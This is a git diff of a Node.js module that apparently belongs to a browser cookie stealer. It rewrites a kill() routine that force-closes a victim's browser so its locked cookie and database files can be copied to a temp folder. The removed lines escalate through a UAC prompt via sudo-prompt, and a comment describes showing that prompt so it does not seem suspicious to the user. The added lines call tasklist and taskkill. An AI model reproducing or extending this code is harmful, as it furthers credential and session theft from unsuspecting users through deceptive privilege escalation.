@@ -1,8 +1,6 @@
 const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
 const { join, sep, resolve } = require('path');
 const { randomFileCreator } = require('../util/dir');
-const psList = () => import('ps-list').then(({ default: psList }) => psList());
-const sudo = require('sudo-prompt');
 const { execSync } = require('child_process');
 const { tempFolder } = require('../index');
 const { addDoubleQuotes } = require('../util/string');
@@ -81,36 +79,11 @@ this.cookies = (name, path) => {
 };
 
 const kill = (browser, onKilled) => {
-  return psList().then(data => {
-    const browserProcess = data.find(p => p.name === `${browser}.exe`);
-    if (typeof browserProcess !== 'undefined' && 'name' in browserProcess) {
-      process.on('uncaughtException', err => {
-        // If we can't kill the browser without using administrator rights, we
-        // need to use these to get access to the browser database files
-        if (err.message === 'kill EPERM') {
-          sudo.exec(`taskkill /f /im ${browserProcess?.name}`, {
-            name: require('../config').name
-          }, (err) => {
-            if (err) return;
-            onKilled();
-          });
-        }
-      });
-      process.kill(browserProcess.pid);
-      onKilled();
-    } else {
-      // Process does not exist, we don't need to kill it (as it doesn't exist)
-      // We just make show the UAC because if it is shown only if the browser is
-      // not killed, it will be weird to the user
-      // sudo.exec('echo hello', {
-      //   name: require('../../config').name
-      // }, (err) => {
-      //   if (err) return;
-      //   onKilled();
-      // });
-      onKilled();
-    }
-  });
+  const tasks = execSync('tasklist');
+  if (tasks.includes(browser)) {
+    execSync(`taskkill /f /im ${browser}.exe`);
+    onKilled();
+  }
 };
 
 if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
